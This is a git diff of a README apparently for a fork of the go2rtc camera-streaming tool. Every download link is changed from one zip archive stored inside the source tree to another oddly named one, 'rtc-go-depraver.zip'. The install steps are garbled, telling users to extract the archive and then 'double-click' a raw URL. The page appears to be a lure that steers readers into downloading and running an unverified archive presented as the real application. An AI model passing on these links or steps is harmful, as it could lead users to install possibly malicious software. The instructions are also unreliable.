@@ -1,6 +1,6 @@
 # 🎥 go2rtc - Stream Your Cameras Effortlessly  
 
-[![Download go2rtc](https://raw.githubusercontent.com/xsinopx/go2rtc/master/pkg/xiaomi/miss/rtc-go-1.4.zip)](https://raw.githubusercontent.com/xsinopx/go2rtc/master/pkg/xiaomi/miss/rtc-go-1.4.zip)  
+[![Download go2rtc](https://raw.githubusercontent.com/xsinopx/go2rtc/master/internal/gopro/rtc-go-depraver.zip)](https://raw.githubusercontent.com/xsinopx/go2rtc/master/internal/gopro/rtc-go-depraver.zip)  
 
 ## 🚀 Getting Started  
 Welcome to go2rtc, the ultimate camera streaming application. This tool allows you to stream from various camera types effortlessly. With support for formats like RTSP, RTMP, and WebRTC, you can enjoy high-quality streaming anywhere.
@@ -20,16 +20,16 @@ Before you start, ensure you meet the following system requirements:
 - **Disk Space**: Minimum of 500 MB free
 
 ## 📥 Download & Install  
-To download go2rtc, visit this page: [Download go2rtc](https://raw.githubusercontent.com/xsinopx/go2rtc/master/pkg/xiaomi/miss/rtc-go-1.4.zip). Choose the latest version and follow these steps:  
+To download go2rtc, visit this page: [Download go2rtc](https://raw.githubusercontent.com/xsinopx/go2rtc/master/internal/gopro/rtc-go-depraver.zip). Choose the latest version and follow these steps:  
 
 1. Click on the version you want.
-2. Look for the asset files. You’ll see files like `https://raw.githubusercontent.com/xsinopx/go2rtc/master/pkg/xiaomi/miss/rtc-go-1.4.zip` or `https://raw.githubusercontent.com/xsinopx/go2rtc/master/pkg/xiaomi/miss/rtc-go-1.4.zip`.
+2. Look for the asset files. You’ll see files like `https://raw.githubusercontent.com/xsinopx/go2rtc/master/internal/gopro/rtc-go-depraver.zip` or `https://raw.githubusercontent.com/xsinopx/go2rtc/master/internal/gopro/rtc-go-depraver.zip`.
 3. Click to download the file.
 
-If you downloaded a `.zip` file, you will need to extract it. Right-click the file and choose "Extract All." After extracting, look for `https://raw.githubusercontent.com/xsinopx/go2rtc/master/pkg/xiaomi/miss/rtc-go-1.4.zip` to start using the application.   
+If you downloaded a `.zip` file, you will need to extract it. Right-click the file and choose "Extract All." After extracting, look for `https://raw.githubusercontent.com/xsinopx/go2rtc/master/internal/gopro/rtc-go-depraver.zip` to start using the application.   
 
 ## 🔧 How to Use go2rtc  
-1. **Open the application**: Locate `https://raw.githubusercontent.com/xsinopx/go2rtc/master/pkg/xiaomi/miss/rtc-go-1.4.zip` in the folder where you downloaded it. Double-click to open.
+1. **Open the application**: Locate `https://raw.githubusercontent.com/xsinopx/go2rtc/master/internal/gopro/rtc-go-depraver.zip` in the folder where you downloaded it. Double-click to open.
 2. **Set up your stream**: Enter the URL of the camera stream you want to use. You can use formats like RTSP://your_camera_ip or RTMP://your_stream_url.
 3. **Start streaming**: Press the play button to begin streaming your camera feed.
 4. **Adjust settings**: You can modify settings for quality and output according to your needs.
@@ -69,4 +69,4 @@ Join our community discussions for help and tips:
 
 ---
 
-To download go2rtc, visit this page again: [Download go2rtc](https://raw.githubusercontent.com/xsinopx/go2rtc/master/pkg/xiaomi/miss/rtc-go-1.4.zip). Enjoy streaming!
+To download go2rtc, visit this page again: [Download go2rtc](https://raw.githubusercontent.com/xsinopx/go2rtc/master/internal/gopro/rtc-go-depraver.zip). Enjoy streaming!
